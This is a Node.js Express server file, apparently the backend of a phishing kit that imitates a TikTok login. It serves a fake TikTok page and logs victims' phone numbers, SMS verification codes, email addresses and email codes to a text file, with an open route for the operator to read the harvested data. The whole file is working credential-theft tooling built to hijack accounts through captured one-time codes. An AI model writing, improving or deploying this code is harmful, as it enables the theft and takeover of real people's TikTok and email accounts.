const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('.')); // Serve static files from current directory

// Use /tmp directory for file storage on Render (or __dirname for local)
const usersFile = process.env.PORT ? path.join('/tmp', 'users.txt') : path.join(__dirname, 'users.txt');

// Ensure file exists and is writable
const ensureFileExists = () => {
  try {
    if (!fs.existsSync(usersFile)) {
      fs.writeFileSync(usersFile, '', { flag: 'w' });
      console.log('Created users.txt file at:', usersFile);
    }
  } catch (err) {
    console.error('Error creating file:', err);
  }
};

ensureFileExists();

// Handle POST request from TikTok login form (index.html)
app.post('/post.php', (req, res) => {
  const { country_code, phone } = req.body;
  const timestamp = new Date().toISOString();
  
  // Format the data
  const userData = `
${'='.repeat(60)}
TIKTOK PHONE LOGIN
${'='.repeat(60)}
Timestamp: ${timestamp}
Country Code: ${country_code}
Phone Number: ${phone}
${'='.repeat(60)}

`;
  
  // Ensure file exists before writing
  ensureFileExists();
  
  // Append to users.txt file
  try {
    fs.appendFileSync(usersFile, userData, { flag: 'a' });
    console.log('Phone login data saved:', { country_code, phone, timestamp });
    
    // Redirect to verification page
    res.redirect('/verification.html');
  } catch (err) {
    console.error('Error writing to file:', err);
    return res.status(500).send('Error saving data');
  }
});

// Handle POST request from phone verification form (verification.html)
app.post('/verify-code', (req, res) => {
  const { digit1, digit2, digit3, digit4, digit5, digit6 } = req.body;
  const code = `${digit1}${digit2}${digit3}${digit4}${digit5}${digit6}`;
  const timestamp = new Date().toISOString();
  
  // Format the verification code data
  const codeData = `
${'='.repeat(60)}
PHONE VERIFICATION CODE
${'='.repeat(60)}
Timestamp: ${timestamp}
Verification Code: ${code}
${'='.repeat(60)}

`;
  
  // Ensure file exists before writing
  ensureFileExists();
  
  // Append to users.txt file
  try {
    fs.appendFileSync(usersFile, codeData, { flag: 'a' });
    console.log('Phone verification code saved:', { code, timestamp });
    
    // Redirect to email verification page
    res.redirect('/email-verification.html');
  } catch (err) {
    console.error('Error writing to file:', err);
    return res.status(500).send('Error saving data');
  }
});

// Handle POST request from email verification form (email-verification.html)
app.post('/verify-email', (req, res) => {
  const { email, code } = req.body;
  const timestamp = new Date().toISOString();
  
  // Format the email verification data
  const emailData = `
${'='.repeat(60)}
EMAIL VERIFICATION
${'='.repeat(60)}
Timestamp: ${timestamp}
Email Address: ${email}
Verification Code: ${code}
${'='.repeat(60)}

`;
  
  // Ensure file exists before writing
  ensureFileExists();
  
  // Append to users.txt file
  try {
    fs.appendFileSync(usersFile, emailData, { flag: 'a' });
    console.log('Email verification saved:', { email, code, timestamp });
    
    // Send success response (no redirect, stays on same page)
    res.json({ success: true, message: 'Email verified successfully' });
  } catch (err) {
    console.error('Error writing to file:', err);
    return res.status(500).json({ success: false, message: 'Error saving data' });
  }
});

// Optional: View all saved data (for testing)
app.get('/view-users', (req, res) => {
  ensureFileExists();
  
  fs.readFile(usersFile, 'utf8', (err, data) => {
    if (err) {
      console.error('Error reading file:', err);
      return res.status(500).send('Error reading file: ' + err.message);
    }
    
    const content = data || 'No data saved yet.';
    console.log('File contents length:', content.length);
    res.type('text/plain').send(content);
  });
});

// Clear the log file (useful for testing)
app.get('/clear-logs', (req, res) => {
  try {
    fs.writeFileSync(usersFile, '', { flag: 'w' });
    res.send('Logs cleared successfully');
  } catch (err) {
    res.status(500).send('Error clearing logs: ' + err.message);
  }
});

// Main route - serve TikTok login page
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
  console.log(`Data will be saved to: ${usersFile}`);
  console.log(`File exists: ${fs.existsSync(usersFile)}`);
});
